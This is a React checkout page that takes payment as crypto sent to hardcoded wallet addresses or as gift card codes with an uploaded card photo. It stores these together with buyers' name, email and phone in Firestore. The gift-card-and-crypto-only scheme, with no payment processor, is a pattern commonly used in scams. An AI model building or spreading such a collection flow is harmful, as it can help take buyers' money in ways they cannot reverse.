// src/pages/PaymentPage.jsx
import React, { useState, useRef } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import { toast } from 'react-toastify';
import { FaUpload } from 'react-icons/fa';
import { db } from '../firebase';
import { collection, addDoc, Timestamp } from 'firebase/firestore';

const walletAddresses = {
  BTC: 'bc1qk3gazvx0n6l6wtsc9v0fvhegvnnfuqh4w95cte',
  ETH: '0xc5e57212ceAFff1522bF266563CBbE0F6D3e6dbC',
  USDT: '0xc5e57212ceAFff1522bF266563CBbE0F6D3e6dbC',
  TRX: 'TPZHZJ6dJb9rBdFhNzGjEXhp2NBDufyxNv',
};

const PaymentPage = () => {
  const location = useLocation();
  const navigate = useNavigate();
  const fileInputRef = useRef(null);

  const { selectedItems } = location.state || { selectedItems: [] };
  const [selectedCrypto, setSelectedCrypto] = useState('');
  const [fileName, setFileName] = useState('');
  const [giftCardType, setGiftCardType] = useState('');
  const [giftCardCode, setGiftCardCode] = useState('');
  const [imagePreview, setImagePreview] = useState(null);
  const [fullName, setFullName] = useState('');
  const [email, setEmail] = useState('');
  const [phone, setPhone] = useState('');
  const [extraNote, setExtraNote] = useState('');
  const [isLoading, setIsLoading] = useState(false);

  const total = selectedItems.reduce((sum, item) => sum + item.price, 0);
  const isGiftCardSelected = giftCardType || fileName || giftCardCode;
  const isCryptoSelected = selectedCrypto !== '';

  const handleFileUpload = (e) => {
    const file = e.target.files[0];
    if (file) {
      setFileName(file.name);
      setImagePreview(URL.createObjectURL(file));
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    const userInfoValid = fullName && email && phone;
    const cryptoValid = isCryptoSelected;
    const giftCardValid = giftCardType && fileName && giftCardCode.trim() !== '';

    if ((cryptoValid && giftCardValid) || (!cryptoValid && !giftCardValid)) {
      toast.error('Please use only one payment method — either Crypto or Gift Card.');
      return;
    }

    if (!userInfoValid) {
      toast.error('Please fill in your name, email, and phone number.');
      return;
    }

    setIsLoading(true);

    try {
      await addDoc(collection(db, 'payments'), {
        selectedItems,
        total,
        paymentMethod: cryptoValid ? 'Crypto' : 'Gift Card',
        selectedCrypto: cryptoValid ? selectedCrypto : null,
        giftCardType: giftCardValid ? giftCardType : null,
        giftCardCode: giftCardValid ? giftCardCode : null,
        uploadedFile: giftCardValid ? fileName : null,
        fullName,
        email,
        phone,
        extraNote,
        createdAt: Timestamp.now(),
      });

      setTimeout(() => {
        setIsLoading(false);
        toast.success('Payment information submitted successfully!');
        navigate('/payment-thank-you', {
          state: {
            selectedItems,
            total,
            selectedCrypto,
            giftCardType,
            giftCardCode,
            fullName,
            email,
            phone,
            extraNote,
          },
        });
      }, 5000);
    } catch (error) {
      setIsLoading(false);
      console.error('Error saving to Firestore:', error);
      toast.error('Something went wrong while saving your data.');
    }
  };

  return (
    <div className="max-w-2xl mx-auto p-6">
      <h1 className="text-3xl font-bold mb-6 text-center text-pink-700">Payment Instructions</h1>

      <div className="bg-pink-600 text-white p-4 mb-6 rounded-lg shadow">
        <h2 className="text-xl font-semibold mb-3">Your Selections</h2>
        <ul className="text-sm space-y-2">
          {selectedItems.map((item) => (
            <li key={item.id} className="flex justify-between">
              <span>{item.label}</span>
              <span>${item.price}</span>
            </li>
          ))}
        </ul>
        <div className="border-t border-white mt-3 pt-3 flex justify-between font-semibold">
          <span>Total:</span>
          <span>${total}</span>
        </div>
      </div>

      <form onSubmit={handleSubmit} className="space-y-6">
        {/* Crypto Payment */}
        <div className="bg-pink-600 text-white p-4 rounded space-y-3">
          <h3 className="text-lg font-bold">1. Pay with Crypto</h3>
          <select
            value={selectedCrypto}
            onChange={(e) => setSelectedCrypto(e.target.value)}
            className="w-full border p-2 rounded bg-white text-pink-700"
            disabled={isGiftCardSelected}
          >
            <option value="">-- Select Crypto Method --</option>
            <option value="BTC">Bitcoin (BTC)</option>
            <option value="ETH">Ethereum (ETH)</option>
            <option value="USDT">USDT (ERC20/BEP20)</option>
            <option value="TRX">Tron (TRX)</option>
          </select>

          {selectedCrypto && (
            <div className="mt-3">
              <p className="text-sm font-medium">Wallet Address:</p>
              <p className="font-mono text-xs text-pink-700 bg-white p-2 rounded border border-dashed">
                {walletAddresses[selectedCrypto]}
              </p>
            </div>
          )}
        </div>

        <div className="text-center font-bold text-gray-500">OR</div>

        {/* Gift Card Section */}
        <div className="bg-pink-600 text-white p-4 rounded space-y-3">
          <h3 className="text-lg font-bold">2. Pay with Gift Card</h3>
          <select
            value={giftCardType}
            onChange={(e) => setGiftCardType(e.target.value)}
            className="w-full border p-2 rounded bg-white text-pink-700"
            disabled={isCryptoSelected}
          >
            <option value="">-- Select Gift Card Type --</option>
            <option value="Amazon">Amazon</option>
            <option value="Apple">Apple</option>
            <option value="Steam">Steam</option>
            <option value="Sephora">Sephora</option>
            <option value="Vanilla">Vanilla Visa</option>
            <option value="Xbox">Xbox</option>
            <option value="AMEX">American Express</option>
          </select>

          <button
            type="button"
            onClick={() => !isCryptoSelected && fileInputRef.current.click()}
            className={`w-full flex items-center justify-center gap-2 bg-white text-pink-600 py-2 px-4 rounded hover:bg-gray-200 ${
              isCryptoSelected ? 'opacity-50 cursor-not-allowed' : ''
            }`}
            disabled={isCryptoSelected}
          >
            <FaUpload />
            {fileName ? 'Change File' : 'Upload Gift Card Image'}
          </button>

          <input
            ref={fileInputRef}
            type="file"
            accept="image/*"
            className="hidden"
            onChange={handleFileUpload}
            disabled={isCryptoSelected}
          />

          {imagePreview && (
            <div className="text-center">
              <img
                src={imagePreview}
                alt="Gift Card Preview"
                className="max-w-xs mx-auto rounded shadow border"
              />
            </div>
          )}

          <input
            type="text"
            placeholder="Enter gift card code"
            value={giftCardCode}
            onChange={(e) => setGiftCardCode(e.target.value)}
            className="w-full border text-pink-600 border-gray-300 p-2 rounded"
            disabled={isCryptoSelected}
          />
        </div>

        {/* Contact Info */}
        <div className="bg-white p-4 rounded space-y-3 shadow">
          <h3 className="text-lg font-bold text-pink-700">Contact Information</h3>
          <input
            type="text"
            placeholder="Full Name"
            value={fullName}
            onChange={(e) => setFullName(e.target.value)}
            className="w-full border p-2 rounded"
          />
          <input
            type="email"
            placeholder="Email Address"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            className="w-full border p-2 rounded"
          />
          <input
            type="tel"
            placeholder="Phone Number"
            value={phone}
            onChange={(e) => setPhone(e.target.value)}
            className="w-full border p-2 rounded"
          />
          <textarea
            placeholder="Tell us what you paid for"
            value={extraNote}
            onChange={(e) => setExtraNote(e.target.value)}
            className="w-full border p-2 rounded h-24"
          />
        </div>

        <button
          type="submit"
          disabled={isLoading}
          className={`w-full py-2 rounded text-white flex items-center justify-center ${
            isLoading
              ? 'bg-gray-500 cursor-not-allowed'
              : 'bg-pink-700 hover:bg-gray-800'
          }`}
        >
          {isLoading ? (
            <span className="flex items-center gap-2">
              <svg
                className="animate-spin h-5 w-5 text-white"
                xmlns="http://www.w3.org/2000/svg"
                fill="none"
                viewBox="0 0 24 24"
              >
                <circle
                  className="opacity-25"
                  cx="12"
                  cy="12"
                  r="10"
                  stroke="currentColor"
                  strokeWidth="4"
                ></circle>
                <path
                  className="opacity-75"
                  fill="currentColor"
                  d="M4 12a8 8 0 018-8v4l4-4-4-4v4a8 8 0 100 16v-4l-4 4 4 4v-4a8 8 0 01-8-8z"
                ></path>
              </svg>
              Processing...
            </span>
          ) : (
            'Submit Payment Info'
          )}
        </button>
      </form>
    </div>
  );
};

export default PaymentPage;
